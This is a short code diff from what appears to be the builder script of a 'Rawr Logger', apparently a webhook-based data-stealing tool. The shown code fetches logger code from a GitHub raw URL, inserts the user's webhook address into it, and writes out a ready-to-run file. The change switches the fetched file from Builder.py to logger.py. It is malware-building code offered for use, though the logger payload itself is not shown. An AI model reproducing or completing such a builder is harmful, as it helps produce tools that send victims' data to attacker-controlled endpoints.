@@ -25,7 +25,7 @@ else:
     time.sleep(3) 
     exit()
 name = Write.Input("Enter File Name:", Colors.green_to_yellow, interval=0.01)
-code = requests.get("https://raw.githubusercontent.com/Joseloll/Rawr-Logger/main/Builder.py")
+code = requests.get("https://raw.githubusercontent.com/Joseloll/Rawr-Logger/main/logger.py")
 with open(f"{name}.py", 'w', encoding='utf8') as f:
     f.write(code.text.replace("Webhooks", webhook))
 Write.Print("Rawr Logger Was SucessFully Built\n",Colors.white_to_green, interval=0.01)
